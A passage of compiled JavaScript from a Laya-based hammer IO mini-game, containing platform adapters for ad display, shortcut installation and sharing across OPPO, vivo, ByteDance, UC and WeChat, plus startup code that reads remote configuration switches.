            this.m_icon = this.getChild('icon').asLoader;
            this.m_btnClose = this.getChild('btnClose').asButton;
            this.visible = false;
            mvc.on(GameEvt.NATIVEAD_REFRESH, this, (data, firstIcon = true) => {
                this.setData(data, firstIcon);
            });
            mvc.on(GameEvt.LOADNATIVE_FAIL, this, () => {
                this.visible = false;
            });
            this.m_icon.onClick(this, () => {
                if (this._adInfo) {
                    Game.PlatAdUtil.clickNativeAd();
                }
            });
            this.m_btnClose.onClick(this, () => {
                this.visible = false;
                mvc.send(GameEvt.NATIVEAD_HIDE);
            });
            this.setData(Game.nativeData);
        }
        setData(data, firstIcon = true) {
            this._adInfo = data;
            console.log('adinfo', this._adInfo);
            if (!this._adInfo) {
                this.visible = false;
                return;
            }
            if (firstIcon) {
                if (this._adInfo.icon) {
                    this.m_icon.url = this._adInfo.icon;
                    this.visible = true;
                }
                else if (this._adInfo.imgUrlList && this._adInfo.imgUrlList[0]) {
                    this.m_icon.url = this._adInfo.imgUrlList[0];
                    this.visible = true;
                }
            }
            else {
                if (this._adInfo.imgUrlList && this._adInfo.imgUrlList[0]) {
                    this.m_icon.url = this._adInfo.imgUrlList[0];
                    this.visible = true;
                }
                else if (this._adInfo.icon) {
                    this.m_icon.url = this._adInfo.icon;
                    this.visible = true;
                }
            }
        }
    }
    NavLdrBar.URL = 'ui://6v1f57qyid2pat6bg';
    Game.NavLdrBar = NavLdrBar;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class OppoPlat {
        constructor(platType) {
            this._platType = 'oppo';
            this.noAdTime = 5;
            this.refreshTime = 40;
            this.isshow = false;
            this._hasShortcutInstalled = false;
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['qg'];
        }
        init() {
            window['qg']['onHide'](() => {
                Game.SoundManager.stopBGM();
                if (this._hasShortcutInstalled == false && this.isshow == false && ConfigMgr.Load_3D_Over == 1) {
                    this.isshow = true;
                    Laya.timer.once(60000, this, () => {
                        this.isshow = false;
                    });
                    k7.AppWindow.show(Game.AddWindow);
                }
            });
            window['qg']['onShow'](() => {
                Game.SoundManager.playBGM("");
            });
            if (Laya.Browser.window.qg.hasShortcutInstalled) {
                console.log("创建桌面图标，每次创建都需要用户授权");
                Laya.Browser.window.qg.hasShortcutInstalled({
                    success: (res) => {
                        if (!res) {
                            ConfigMgr.adddesk_switch = 1;
                            console.log("用户未创建桌面图标");
                            this._hasShortcutInstalled = false;
                        }
                        else {
                            ConfigMgr.adddesk_switch = 0;
                            mvc.send(ConfigMgr.closeAddDesk);
                            this._hasShortcutInstalled = true;
                            console.log("用户已创建桌面图标");
                        }
                    }
                });
            }
            this._setRewardPoint();
            this._initAdInfo();
        }
        hasShortcutInstalled() {
            return this._hasShortcutInstalled;
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
        _initAdInfo() {
            Game.PlatAdUtil.installShortcut = function (success, fail) {
                let _this = this;
                console.log("创建桌面图标");
                if (Laya.Browser.window.qg.installShortcut) {
                    Laya.Browser.window.qg.installShortcut({
                        success: () => {
                            _this._hasShortcutInstalled = true;
                            if (!!success)
                                success();
                            mvc.send(ConfigMgr.closeAddDesk);
                            console.log("创建图标成功");
                        },
                        fail: () => {
                            console.log("创建图标失败");
                            if (!!fail)
                                fail();
                        }
                    });
                }
            };
            Game.PlatAdUtil.showGameBannerAd = function () {
                if (window['qg'].getSystemInfoSync().platformVersionCode >= 1076) {
                    Game.platMgr.plat.gameBannerAd = window['qg']['createGameBannerAd']({
                        adUnitId: '357184'
                    });
                    Game.platMgr.plat.gameBannerAd.onError(function (err) {
                        console.log(err);
                    });
                    Game.platMgr.plat.gameBannerAd.onLoad(function () {
                        console.log('互推盒子横幅广告加载成功');
                    });
                    Game.platMgr.plat.gameBannerAd.show().then(function () {
                        console.log('show success');
                    }).catch(function (error) {
                        console.log('show fail with:' + error.errCode + ',' + error.errMsg);
                    });
                }
                else {
                    console.log('快应用平台版本号低于1076，暂不支持互推盒子相关 API');
                }
            };
            Game.PlatAdUtil.hideGameBannerAd = function () {
                if (Game.platMgr.plat.platType == Game.PlatType.oppo && window['qg'].getSystemInfoSync().platformVersionCode >= 1076) {
                    if (Game.platMgr.plat.gameBannerAd) {
                        Game.platMgr.plat.gameBannerAd.offError(null);
                        Game.platMgr.plat.gameBannerAd.offLoad(null);
                        Game.platMgr.plat.gameBannerAd.hide().then(function () {
                            console.log('hide success');
                        }).catch(function (error) {
                            console.log('hide fail with:' + error.errCode + ',' + error.errMsg);
                        });
                        Game.platMgr.plat.gameBannerAd.destroy().then(function () {
                            Game.platMgr.plat.gameBannerAd = null;
                            console.log('destroy success');
                        }).catch(function (error) {
                            console.log('destroy fail with:' + error.errCode + ',' + error.errMsg);
                        });
                    }
                }
            };
            Game.PlatAdUtil.loadNativeAd = function (success, fail, idx) {
                if (getTimer() <= Game.platMgr.plat.noAdTime * 1000) {
                    if (!!fail)
                        fail();
                    Laya.timer.clearAll(Game.platMgr.plat);
                    Laya.timer.once(Game.platMgr.plat.noAdTime * 1000 - getTimer(), Game.platMgr.plat, () => {
                        Game.platMgr.plat.nativeObject = k7.xsdk.agentManager.getAdsPlugin().loadNativeAd({
                            unitId: "",
                            success,
                            fail
                        });
                    });
                    return;
                }
                Game.platMgr.plat.nativeObject = k7.xsdk.agentManager.getAdsPlugin().loadNativeAd({
                    unitId: "",
                    success,
                    fail
                });
            };
            Game.PlatAdUtil.clickNativeAd = function () {
                Game.platMgr.plat.nativeObject && Game.platMgr.plat.nativeObject.reportAdClick();
            };
            Game.PlatAdUtil.loadInterAd = function () {
                return;
            };
            Game.PlatAdUtil.showInterAd = function (close) {
                return;
            };
            Game.PlatAdUtil.showPortalAd = function () {
                if (window['qg'].getSystemInfoSync().platformVersionCode >= 1076) {
                    let _this = this;
                    this.portalAd = window['qg'].createGamePortalAd({
                        adUnitId: '357351'
                    });
                    this.portalAd.load();
                    this.portalAd.onLoad(function () {
                        console.log('互推盒子九宫格广告加载成功');
                        _this.portalAd.show().then(function () {
                            console.log('show success');
                        }).catch(function (error) {
                            console.log('show fail with:' + error.errCode + ',' + error.errMsg);
                        });
                    });
                    this.portalAd.onError(function (err) {
                        console.log(err);
                    });
                    this.portalAd.onClose(function () {
                        _this.portalAd.offLoad(null);
                        _this.portalAd.offError(null);
                        _this.portalAd.offClose(null);
                        _this.portalAd.destroy();
                    });
                }
                else {
                    console.log('快应用平台版本号低于1076，暂不支持互推盒子相关 API');
                }
            };
            Laya.timer.once(5000, this, this.refreshNativeAd);
        }
        refreshNativeAd() {
            Game.PlatAdUtil.loadNativeAd((res) => {
                mvc.send(GameEvt.NATIVEAD_REFRESH, res);
                Game.nativeData = res;
            }, () => {
                mvc.send(GameEvt.LOADNATIVE_FAIL);
            });
            Laya.timer.once(Game.nativetime * 1000, this, this.refreshNativeAd);
        }
    }
    Game.OppoPlat = OppoPlat;
})(Game || (Game = {}));
var Game;
(function (Game) {
    let ShareType;
    (function (ShareType) {
        ShareType[ShareType["NONE"] = 0] = "NONE";
        ShareType[ShareType["ARTICLE"] = 1] = "ARTICLE";
        ShareType[ShareType["VIDEO"] = 2] = "VIDEO";
        ShareType[ShareType["TOKEN"] = 3] = "TOKEN";
    })(ShareType = Game.ShareType || (Game.ShareType = {}));
    class TTAdapter {
        get ttEnv() {
            return !!window['tt'];
        }
        initAdapter() {
            if (!this.ttEnv)
                return;
            fairygui.UIPackage.branch = 'TT';
            this._gameTimes = 0;
            mvc.on(GameEvt.GAME_START, this, this.gameStart);
            mvc.on(GameEvt.GAMEOVER_SHOW, this, this.showGameOver);
            Game.ViewManager.showSuccess = this.showSuccess.bind(this);
        }
        gameStart() {
            Game.recordMgr.startGameRecorder();
        }
        showGameOver() {
            this._gameTimes++;
            if (+Game.gameSwitch === 1) {
                Laya.timer.once(1000, this, () => {
                    Game.PlatAdUtil.showInterAd();
                });
            }
            else {
                Game.PlatAdUtil.showInterAd();
            }
            if (this._flag)
                return;
            this._flag = true;
            k7.getFairyInstence(Game.MySuccessWindow).showHome = this.showHome.bind(this);
        }
        showHome() {
            if (this._gameTimes >= +Game.gameVideo && +Game.gameSwitch === 1) {
                Game.rpMgr.getReward(Game.RewardPointId.ForceVideo, null, null, () => {
                    k7.getFairyInstence(Game.MySuccessWindow).backToHome();
                });
            }
            else {
                k7.getFairyInstence(Game.MySuccessWindow).backToHome();
            }
        }
        showSuccess() {
            Game.recordMgr.stopGameRecorder();
            if (Game.GameCfg.plat == "uc")
                return;
            k7.AppWindow.show(Game.ShareVideoWindow);
        }
        getShareInfo() {
            let idx = Math.floor(Math.random() * Game.shareList.length);
            return Game.shareList[idx];
        }
        shareApp(d) {
            let extra = {};
            let shareInfo = this.getShareInfo();
            if (d.channel === ShareType.VIDEO) {
                shareInfo.title = ' 一锤一个大坏蛋';
                extra = {
                    videoPath: d.recordUrl,
                    videoTopics: ['一锤之王', ' IO'],
                    hashtag_list: ['一锤之王', ' IO']
                };
            }
            window["tt"].shareAppMessage({
                channel: "video",
                title: shareInfo.title,
                query: 'shareId=' + shareInfo.uid,
                extra: extra,
                success() {
                    d.success && d.success();
                },
                fail(e) {
                    d.fail && d.fail();
                }
            });
        }
    }
    Game.TTGameAdapter = new TTAdapter();
})(Game || (Game = {}));
var Game;
(function (Game) {
    class TtPlat {
        constructor(platType) {
            this._platType = 'tt';
            this._lastInterAdTime = 0;
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['tt'];
        }
        init() {
            window['tt']['onHide'](() => {
                Game.SoundManager.stopBGM();
            });
            window['tt']['onShow'](() => {
                Game.SoundManager.playBGM("");
            });
            this._setRewardPoint();
            Game.recordMgr.initManager();
            Game.PlatAdUtil.loadInterAd = function () {
                if (window['tt'].getSystemInfoSync().platform == 'devtools')
                    return;
                k7.xsdk.agentManager.getAdsPlugin().preloadInterstitialAd({
                    unitId: "",
                    close: (res) => {
                        Game.PlatAdUtil.loadInterAd();
                    }
                });
            };
            Game.PlatAdUtil.showInterAd = function (close) {
                if (window['tt'].getSystemInfoSync().platform == 'devtools')
                    return;
                console.log("准备显示插屏");
                if (getTimer() <= 20000) {
                    console.log("游戏刚开始一段时间不允许展示插屏");
                    return;
                }
                if (Game.TimeTools.getCrtTime() - Game.platMgr.plat._lastInterAdTime <= 30 * 1000) {
                    console.log("距离上次显示插屏或激励视频不到30秒，不能显示");
                    return;
                }
                Game.platMgr.plat._lastInterAdTime = Game.TimeTools.getCrtTime();
                k7.xsdk.agentManager.getAdsPlugin().showInterstitial({
                    unitId: "",
                    close: (res) => {
                        Game.PlatAdUtil.loadInterAd();
                    }
                });
            };
            Game.PlatAdUtil.loadInterAd();
            mvc.on("VideoError", this, () => {
                Game.MultiPlatforms.showToast("暂无广告，请稍后再试");
            });
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
        isSupportMoreGame() {
            return window['tt'] && window['tt'].getSystemInfoSync().platform != "ios";
        }
        login(loginObj) {
        }
        showMoreGamesModal() {
            if (!this.isSupportMoreGame())
                return;
            window["tt"]['showMoreGamesModal']();
        }
    }
    Game.TtPlat = TtPlat;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class UCPlat {
        constructor(platType) {
            this._platType = 'uc';
            this.bannerAd = null;
            this.rewardedVideoAd = null;
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['qg'];
        }
        init() {
            this._setRewardPoint();
            this.initAdInfo();
        }
        initAdInfo() {
            Game.PlatAdUtil.showBannerAd = this.showBannerAd;
            Game.PlatAdUtil.hideBannerAd = this.hideBannerAd;
            Game.PlatAdUtil.showVideoAd = this.showVideoAd;
            Game.PlatAdUtil.showInterAd = this.showInterstitial;
        }
        createBannerAd() {
            console.log('bannerAd 广告加载 start ');
            let res = Laya.Browser.window.uc.getSystemInfoSync();
            if (typeof res === 'string') {
                try {
                    res = JSON.parse(res);
                }
                catch (e) { }
            }
            let deviceWidth = res.screenWidth > res.screenHeight ? res.screenHeight : res.screenWidth;
            let width = deviceWidth / 2;
            let height = (width * 194) / 345;
            this.bannerAd = Laya.Browser.window.uc.createBannerAd({
                style: {
                    width: width,
                    height: height,
                    gravity: 7,
                },
            });
            this.bannerAd.onError(err => {
                console.log('bannerAd 广告加载出错', err);
            });
            this.bannerAd.onLoad(() => {
                console.log('bannerAd 广告加载成功');
            });
        }
        showBannerAd() {
            console.log('bannerAd 广告加载 start ');
            let res = Laya.Browser.window.uc.getSystemInfoSync();
            if (typeof res === 'string') {
                try {
                    res = JSON.parse(res);
                }
                catch (e) { }
            }
            let deviceWidth = res.screenWidth > res.screenHeight ? res.screenHeight : res.screenWidth;
            let width = deviceWidth / 2;
            let height = (width * 194) / 345;
            this.bannerAd = Laya.Browser.window.uc.createBannerAd({
                style: {
                    width: width,
                    height: height,
                    gravity: 7,
                },
            });
            this.bannerAd.onError(err => {
                console.log('bannerAd 广告加载出错', err);
            });
            this.bannerAd.onLoad(() => {
                console.log('bannerAd 广告加载成功');
            });
            if (this.bannerAd)
                this.bannerAd.show();
        }
        hideBannerAd() {
            if (this.bannerAd)
                this.bannerAd.hide();
        }
        createVideoAd() {
            this.rewardedVideoAd = Laya.Browser.window.uc.createRewardVideoAd();
            this.rewardedVideoAd
                .show()
                .then()
                .catch(err => console.log(err));
            this.rewardedVideoAd.onLoad(() => {
                console.log('激励视频-广告加载成功');
            });
            this.rewardedVideoAd.onError(err => {
                console.log('激励视频-广告加载失败', err);
            });
            this.rewardedVideoAd.onClose(res => {
                if (res && res.isEnded) {
                    console.log('正常播放结束，可以下发游戏奖励 res: ', res);
                    if (this.rewardedVideoAdSuccess)
                        this.rewardedVideoAdSuccess();
                }
                else {
                    console.log('播放中途退出，不下发游戏奖励 res : ', res);
                    if (this.rewardedVideoAdFail)
                        this.rewardedVideoAdFail();
                }
            });
        }
        showVideoAd(rId, success, fail, complete) {
            this.rewardedVideoAdSuccess = success;
            this.rewardedVideoAdFail = fail;
            this.rewardedVideoAd = Laya.Browser.window.uc.createRewardVideoAd();
            this.rewardedVideoAd
                .show()
                .then()
                .catch(err => console.log(err));
            this.rewardedVideoAd.onLoad(() => {
                console.log('激励视频-广告加载成功');
            });
            this.rewardedVideoAd.onError(err => {
                console.log('激励视频-广告加载失败', err);
            });
            this.rewardedVideoAd.onClose(res => {
                if (res && res.isEnded) {
                    console.log('正常播放结束，可以下发游戏奖励 res: ', res);
                    if (this.rewardedVideoAdSuccess)
                        this.rewardedVideoAdSuccess();
                }
                else {
                    console.log('播放中途退出，不下发游戏奖励 res : ', res);
                    if (this.rewardedVideoAdFail)
                        this.rewardedVideoAdFail();
                }
            });
        }
        showInterstitial() {
            let interstitialAd = Laya.Browser.window.uc.createInterstitialAd();
            interstitialAd
                .show()
                .then()
                .catch(err => console.log(err));
            interstitialAd.onLoad(() => {
                console.log('插屏-广告加载成功');
            });
            interstitialAd.onError(err => {
                console.log('插屏-广告加载失败', err);
            });
            interstitialAd.onClose(res => {
                console.log('插屏-关闭');
            });
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
    }
    Game.UCPlat = UCPlat;
})(Game || (Game = {}));
const qg = Laya.Browser.window.qg;
var Game;
(function (Game) {
    class VivoPlat {
        constructor(platType) {
            this._platType = 'vivo';
            this._hasShortcutInstalled = false;
            this.refreshTime = 30;
            this.isshow = false;
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['qg'];
        }
        init() {
            window['qg']['onHide'](() => {
                Game.SoundManager.stopBGM();
                if (this._hasShortcutInstalled == false && this.isshow == false && ConfigMgr.Load_3D_Over == 1) {
                    this.isshow = true;
                    Laya.timer.once(60000, this, () => {
                        this.isshow = false;
                    });
                    k7.AppWindow.show(Game.AddWindow);
                }
            });
            window['qg']['onShow'](() => {
                Game.SoundManager.playBGM("");
            });
            if (Laya.Browser.window.qg.hasShortcutInstalled) {
                console.log("创建桌面图标，每次创建都需要用户授权");
                Laya.Browser.window.qg.hasShortcutInstalled({
                    success: (res) => {
                        if (!res) {
                            ConfigMgr.adddesk_switch = 1;
                            console.log("用户未创建桌面图标");
                            this._hasShortcutInstalled = false;
                        }
                        else {
                            ConfigMgr.adddesk_switch = 0;
                            mvc.send(ConfigMgr.closeAddDesk);
                            this._hasShortcutInstalled = true;
                            console.log("用户已创建桌面图标");
                        }
                    }
                });
            }
            this._setRewardPoint();
            this._initAdInfo();
        }
        static createInterstitialAd() {
            if (qg && qg.createInterstitialAd) {
                let interstitialAd = qg.createInterstitialAd({ adUnitId: "e3eef572fe774178bff5fe869b3b2bee" });
                interstitialAd.onLoad(() => {
                    interstitialAd.show();
                    console.log("插屏广告加载成功");
                });
                interstitialAd.onError((err) => {
                    console.log("插屏广告加载失败", err);
                });
            }
        }
        hasShortcutInstalled() {
            return this._hasShortcutInstalled;
        }
        _initAdInfo() {
            Game.PlatAdUtil.loadNativeAd = function (success, fail, idx) {
                Game.platMgr.plat.nativeObject = k7.xsdk.agentManager.getAdsPlugin().loadNativeAd({
                    unitId: "",
                    success,
                    fail
                });
            };
            Game.PlatAdUtil.clickNativeAd = function () {
                Game.platMgr.plat.nativeObject && Game.platMgr.plat.nativeObject.reportAdClick();
            };
            Game.PlatAdUtil.installShortcut = function (success, fail) {
                let _this = this;
                console.log("创建桌面图标");
                if (Laya.Browser.window.qg.installShortcut) {
                    Laya.Browser.window.qg.installShortcut({
                        success: () => {
                            _this._hasShortcutInstalled = true;
                            if (!!success)
                                success();
                            mvc.send(ConfigMgr.closeAddDesk);
                            console.log("创建图标成功");
                        },
                        fail: () => {
                            console.log("创建图标失败");
                            if (!!fail)
                                fail();
                        }
                    });
                }
            };
            this.refreshNativeAd();
            Game.PlatAdUtil.loadInterAd();
        }
        static hidePortalAd() {
            if (this.boxPortalAd) {
                this.boxPortalAd.hide();
            }
        }
        static showPortalAd() {
            if (Laya.Browser.window.qg.createBoxPortalAd) {
                let self = this;
                this.boxPortalAd = Laya.Browser.window.qg.createBoxPortalAd({
                    posId: '122e5924391446bcbd948c0e20be8a4f',
                    image: 'manygame.png',
                    marginTop: 480
                });
                this.boxPortalAd.onLoad(function () {
                    console.log('互推盒子九宫格广告加载成功');
                    self.boxPortalAd.show();
                });
            }
            else {
                console.log('暂不支持互推盒子相关 API');
            }
        }
        refreshNativeAd() {
            Game.PlatAdUtil.loadNativeAd((res) => {
                mvc.send(GameEvt.NATIVEAD_REFRESH, res);
                Game.nativeData = res;
            }, () => {
                mvc.send(GameEvt.LOADNATIVE_FAIL);
            });
            Laya.timer.once(this.refreshTime * 1000, this, this.refreshNativeAd);
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
    }
    Game.VivoPlat = VivoPlat;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class WebPlat {
        constructor(platType) {
            this._platType = 'web';
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return 'web';
        }
        init() {
            this._setRewardPoint();
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
        }
        login(loginObj) {
        }
    }
    Game.WebPlat = WebPlat;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class WxPlat {
        constructor(platType) {
            this._platType = 'wx';
            this._platType = platType;
        }
        get platType() {
            return this._platType;
        }
        get platFunc() {
            return window['wx'];
        }
        init() {
            wx['showShareMenu']({
                withShareTicket: true,
                menus: ['shareAppMessage', 'shareTimeline'],
                title: "[有人@你]，一锤一个小朋友！",
                imageUrl: "",
                query: "",
                success: () => { },
                fail: () => { },
                complete: () => { }
            });
            wx['onShareAppMessage'](() => {
                let idx = Math.floor(Math.random() * Game.shareList.length);
                return {
                    title: Game.shareList[idx].title,
                    imageUrl: Game.shareList[idx].imageUrl,
                    query: 'shareId=' + Game.shareList[idx].uid
                };
            });
            if (wx['onShareTimeline']) {
                wx['onShareTimeline'](() => {
                    let idx = Math.floor(Math.random() * Game.shareList.length);
                    return {
                        title: Game.shareList[idx].title,
                        imageUrl: Game.shareList[idx].imageUrl,
                        query: 'shareId=' + Game.shareList[idx].uid
                    };
                });
            }
            wx['onHide'](() => {
                Game.SoundManager.stopBGM();
            });
            wx['onShow'](() => {
                Game.SoundManager.playBGM("");
            });
            wx['getSystemInfo']({
                success(res) {
                    console.log("benchmarkLevel:" + res.benchmarkLevel);
                    console.log("model:" + res.model);
                    console.log("platform:" + res.system);
                    let platform = res.system;
                }
            });
            this._setRewardPoint();
        }
        _setRewardPoint() {
            let rpList = Game.rpMgr.getRpList();
            for (let i in rpList) {
                rpList[i].type = Game.RewardType.Video;
            }
        }
        login(loginObj) {
        }
    }
    Game.WxPlat = WxPlat;
})(Game || (Game = {}));
var Game;
(function (Game) {
    let ValuePoint;
    (function (ValuePoint) {
        ValuePoint[ValuePoint["GAME_DELIVERY"] = 1] = "GAME_DELIVERY";
        ValuePoint[ValuePoint["GAME_FUHUO"] = 2] = "GAME_FUHUO";
    })(ValuePoint = Game.ValuePoint || (Game.ValuePoint = {}));
    ;
    function getRamdomName() {
        if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
            return 'Player' + Math.floor(Math.random() * 10000);
        }
        let arr = window['game_nickname'] || [];
        if (arr.length) {
            let idx = Math.floor(Math.random() * arr.length);
            return arr[idx];
        }
        return 'NoName';
    }
    Game.getRamdomName = getRamdomName;
    function getRamdomHeadUrl() {
        if (Game.platMgr.plat.platType == Game.PlatType.pt4399) {
            return 'sub-res/res/icon/head.png';
        }
        return "";
    }
    Game.getRamdomHeadUrl = getRamdomHeadUrl;
    Game.fast = passer.plugin.fast;
    Game.gameSwitch = 0;
    Game.gameNative = 0;
    Game.gameVideo = 0;
    Game.gameBanner = 0;
    Game.game_box = 0;
    Game.game_bannerinterval = 1;
    Game.game_banner = 3;
    Game.game_firstlist = ["1037", "1095", "1058", "1055"];
    Game.game_secondlist = ["1001", "1037", "1058", "1095", "1038", "1089", "1055"];
    Game.game_path = 0;
    Game.nativetime = 30;
    Game.movingSpd = 110;
    Game.killAngle = 46;
    Game.bornSpace = 5;
    Game.robotSpd = 80;
    Game.comboTime = 5;
    Game.killRadius = 80;
    Game.boomRadius = 80;
    Game.turnTime = 1;
    Game.cemaraMin = 8.8;
    Game.cemaraMax = 25.8;
    Game.nowSkinIndex = 0;
    Game.hammerChange = 0;
    Game.overCoin = 0;
    Game.overMaterial = [];
    Game.game_map = "";
    Game.cameraMaxLevel = 15;
    Game.changeDis = 8;
    function initConst() {
        Game.killAngle = Const.killAngle.value[0];
        Game.movingSpd = Const.movingSpd.value[0];
        Game.bornSpace = Const.bornSpace.value[0];
        Game.robotSpd = Const.robotSpd.value[0];
        Game.comboTime = Const.comboTime.value[0];
        Game.killRadius = Const.killRadius.value[0];
        Game.boomRadius = Const.boomRadius.value[0];
        Game.turnTime = Const.turnTime.value[0];
        Game.cemaraMax = Const.cemaraMax.value[0];
        Game.cemaraMin = Const.cemaraMin.value[0];
        Game.cameraMaxLevel = Const.cameraMaxLevel.value[0];
        Game.changeDis = Const.changeDis.value[0];
        if (Laya.Browser.clientWidth / Laya.Browser.clientHeight >= 0.5) {
            ConfigMgr.longPhone = 0;
        }
        else {
            ConfigMgr.longPhone = 1;
        }
    }
    Game.initConst = initConst;
})(Game || (Game = {}));
var Game;
(function (Game) {
    let PlatType;
    (function (PlatType) {
        PlatType["web"] = "web";
        PlatType["wx"] = "wx";
        PlatType["tt"] = "tt";
        PlatType["qq"] = "qq";
        PlatType["oppo"] = "oppo";
        PlatType["vivo"] = "vivo";
        PlatType["mz"] = "mz";
        PlatType["xm"] = "xm";
        PlatType["bili"] = "bili";
        PlatType["alipay"] = "alipay";
        PlatType["bd"] = "bd";
        PlatType["uc"] = "uc";
        PlatType["mgc"] = "mgc";
        PlatType["huawei"] = "huawei";
        PlatType["pt4399"] = "4399";
    })(PlatType = Game.PlatType || (Game.PlatType = {}));
    Game.GameCfg = {
        plat: "",
        debug: true,
        cdn: ""
    };
    function setGameConfig(cdn, debug, plat) {
        Game.GameCfg.cdn = cdn;
        Game.GameCfg.debug = debug;
        Game.GameCfg.plat = plat;
        console.log("cdn:" + cdn, "debug:" + debug, "plat:" + plat);
    }
    Game.setGameConfig = setGameConfig;
    Game.nameList = 0;
})(Game || (Game = {}));

(function (startup) {
    function main() {
        Laya.stage.width = 720;
        Laya.stage.height = 1280;
        Laya3D.init(720, 1280);
        fairygui.UIConfig.packageFileExtension = 'bin';
        fairygui.UIConfig.modalLayerColor = 'rgba(0,0,0,0.88)';
        Laya.stage.addChild(fgui.GRoot.inst.displayObject);
        mvc.on(k7.EVT_SourceLoader_Complete, null, onLoaded);
        Game.initConst();
        Game.Datas.getData();
        Game.setGameConfig(window.getCdn(), window.getDebug(), window.getPlatform());
        let keys = [];
        setMsvr();
        if (Game.GameCfg.plat == Game.PlatType.oppo) {
            keys.push('switch', 'native', "nativetime");
            getKeysData('Oppo', keys, (obj) => {
                setKvData(obj);
            });
        }
        else if (Game.GameCfg.plat == Game.PlatType.tt) {
            keys.push('switch', 'video');
            getKeysData('ZiJie', keys, (obj) => {
                setKvData(obj);
            });
        }
        else if (Game.GameCfg.plat == Game.PlatType.mz) {
            keys.push('switch', 'banner');
            getKeysData('MeiZu', keys, (obj) => {
                setKvData(obj);
            });
        }
        else if (Game.GameCfg.plat == Game.PlatType.vivo) {
            keys.push('switch', 'native', "nativetime");
            getKeysData('Oppo', keys, (obj) => {
                setKvData(obj);
            });
        }
        else if (Game.GameCfg.plat == Game.PlatType.wx || Game.GameCfg.plat == "web") {
            Game.gamescustom = Game.MultiPlatforms.createCacheCustom();
            keys.push('switch', "box", "bannerinterval", "banner", "firstlist", "secondlist", "path", "nativetime");
            getKeysData('Weixin', keys, (obj) => {
                setKvData(obj);
            });
        }
        Game.platMgr.init();
        let path3D = "sub-first/res/3D/";
        let resUrl = 'sub-res/res/fgui';
        let mainUrl = 'sub-main/res/fgui';
        let firstUrl = "sub-first/res/fgui";
        k7.preloader.addSource(new k7.SubPackLoader("sub-first").setImportant(true));
        if (Game.platMgr.plat.platType == Game.PlatType.huawei) {
            k7.preloader.addSource(new k7.FairyLoader("huawei").setLocalUrl(firstUrl).setImportant(true));
        }
        k7.preloader.addSource(new k7.FairyLoader("vivoad").setLocalUrl(firstUrl).setImportant(true), new k7.FairyLoader("common").setLocalUrl(firstUrl).setImportant(true), new k7.FairyLoader("Load").setLocalUrl(firstUrl).setImportant(true), new k7.SubPackLoader("sub-res").setImportant(true), new k7.FairyLoader("fast").setLocalUrl(resUrl).setImportant(true), new k7.FairyLoader("Game").setLocalUrl(resUrl).setImportant(true), new k7.FairyLoader("icon").setLocalUrl(resUrl).setImportant(true), new k7.SubPackLoader("sub-sound").setImportant(true));
        k7.preloader.preload();
    }
    startup.main = main;
    function setMsvr() {
        if (Game.GameCfg.plat == Game.PlatType.pt4399)
            return;
        mapi.appid = '60058';
        mapi.gameid = '640';
        mapi.stage = 'prod';
    }
    function onLoaded(p) {
        if (!p.loaded)
            return;
        if (p.fileName == 'Load') {
            k7.AppScene.show(Game.LoadScene);
        }
        else if (p.fileName == "vivoad") {
            if (Game.GameCfg.plat == Game.PlatType.huawei) {
            }
            else if (Game.GameCfg.plat == Game.PlatType.oppo || Game.GameCfg.plat == Game.PlatType.vivo) {
                Game.regUI(Game.NavLdrBar);
            }
        }
        else if (p.fileName == 'fast') {
            start();
        }
    }
    function getKeysData(channel, keys, success, complete) {
        mapi.loadGameStorage({
            channel: channel,
            keys: keys,
            success: data => {
                let d = {};
                console.log(data);
                for (let i = 0; i < data.length; i += 1) {
                    let key = data[i].key.split('_')[0];
                    d[key] = data[i].value;
                }
                ;
                if (!!success)
                    success(d);
            },
            fail: (err) => {
                console.log("getKVDataErr", err);
                getNameList();
            },
            complete: () => {
                if (!!complete)
                    complete();
            }
        });
    }
    function setKvData(obj) {
        Game.game_firstlist = [];
        Game.game_secondlist = [];
        if (obj['switch']) {
            Game.gameSwitch = obj['switch'];
        }
        if (obj['native']) {
            Game.gameNative = obj['native'];
        }
        if (obj['video']) {
            Game.gameVideo = obj['video'];
        }
        if (obj['banner']) {
            Game.gameBanner = obj['banner'];
        }
        if (obj['box']) {
            Game.game_box = obj['box'];
        }
        if (obj['bannerinterval']) {
            Game.game_bannerinterval = obj['bannerinterval'];
        }
        if (obj['banner']) {
            Game.game_banner = obj['banner'];
        }
        if (obj['firstlist']) {
            let str = obj['firstlist'];
            Game.game_firstlist = str.split(",");
        }
        if (obj['secondlist']) {
            let str = obj['secondlist'];
            Game.game_secondlist = str.split(",");
            ;
        }
        if (obj['path']) {
            Game.game_path = obj['path'];
        }
        if (obj['nativetime']) {
            Game.nativetime = obj['nativetime'];
        }
        getNameList();
    }
    function getNameList() {
        if (Game.GameCfg.plat == Game.PlatType.wx) {
            Game.MultiPlatforms.getViewScene();
        }
        if (Game.GameCfg.plat == Game.PlatType.wx) {
            if (Game.Datas.listFirst == 0) {
                Game.Datas.listFirst = 1;
                Laya.LocalStorage.setItem("listFirst", String(1));
                console.log("首次登陆");
                let condition1 = false;
                for (let i = 0; i < Game.game_firstlist.length; i++) {
                    if (Number(Game.game_firstlist[i]) == Number(Game.MultiPlatforms.scene)) {
                        console.log("满足第一个条件");
                        condition1 = true;
                        break;
                    }
                }
                let condition2 = false;
                if (Game.game_path == 0) {
                    console.log("满足第二个条件");
                    condition2 = true;
                }
                else {
